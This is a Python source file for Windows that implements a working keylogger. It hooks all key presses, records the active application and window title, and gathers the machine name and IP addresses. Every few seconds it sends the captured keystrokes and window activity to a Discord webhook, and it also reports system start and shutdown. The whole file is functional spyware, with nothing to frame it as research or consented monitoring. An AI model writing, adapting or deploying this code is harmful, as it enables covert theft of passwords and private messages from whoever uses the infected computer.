import os
import psutil
import requests
import time
import socket
import win32gui
import win32process
import keyboard
import threading
import atexit
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = ""

# Get PC name
PC_NAME = socket.gethostname()

# Function to get local IPv4 and IPv6 addresses
def get_local_ips():
    ipv4, ipv6 = "Unknown", "Unknown"
    try:
        hostname = socket.gethostname()
        ipv4 = socket.gethostbyname(hostname)
        for addr in socket.getaddrinfo(hostname, None):
            if addr[0] == socket.AF_INET6:
                ipv6 = addr[4][0]
                break
    except socket.error as e:
        print(f"Error fetching IP addresses: {e}")
    return ipv4, ipv6

# Get IP Addresses
IPV4_ADDRESS, IPV6_ADDRESS = get_local_ips()

# Tracking Variables
last_logged = None
keystrokes = ""
keystroke_lock = threading.Lock()
keystroke_app = "Unknown"
keystroke_window = "Unknown"

# Function to send logs to Discord with color coding
def send_to_discord(title, description, color):
    payload = {
        "embeds": [{
            "title": title,
            "description": description,
            "color": color
        }]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

# Function to log system startup
def log_system_start():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Established"
    send_to_discord("SYSTEM START", message, 65280)  # Green

# Function to log system shutdown
def log_system_shutdown():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Lost"
    send_to_discord("SYSTEM SHUTDOWN", message, 16711680)  # Red

# Register shutdown hook
atexit.register(log_system_shutdown)

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return None, None
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd)
    
    return None, None

# Function to send keystrokes
def send_keystrokes():
    global keystrokes, keystroke_app, keystroke_window
    
    with keystroke_lock:
        if keystrokes.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"[{timestamp}] {PC_NAME} - ({keystroke_app} - {keystroke_window}): {keystrokes}"
            send_to_discord("KEYLOG", message, 16776960)  # Yellow
            keystrokes = ""
            keystroke_app, keystroke_window = "Unknown", "Unknown"

# Function to log keystrokes
def log_keystroke(event):
    global keystrokes, keystroke_app, keystroke_window
    
    key = event.name
    
    with keystroke_lock:
        if not keystrokes:
            keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
        
        if len(key) == 1 and key.isprintable():
            keystrokes += key
        elif key == "space":
            keystrokes += " "
        elif key == "enter":
            keystrokes += "\n"
        elif key == "backspace" and keystrokes:
            keystrokes = keystrokes[:-1]

# Start keylogger thread
keyboard.on_press(log_keystroke)
def start_keylogger():
    keyboard.wait()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Function to periodically send keystrokes
def keystroke_monitor():
    while True:
        time.sleep(5)  # Reduced delay for more real-time logging
        send_keystrokes()

keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
keystroke_thread.start()

# Monitoring loop
def monitor():
    global last_logged
    log_system_start()
    try:
        while True:
            new_app_name, new_window_title = get_active_window_title()
            if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
                send_to_discord("WINDOW ACTIVE", message, 255)  # Blue
                last_logged = (new_app_name, new_window_title)
            time.sleep(1)
    except KeyboardInterrupt:
        log_system_shutdown()
        raise

if __name__ == "__main__":
    monitor()
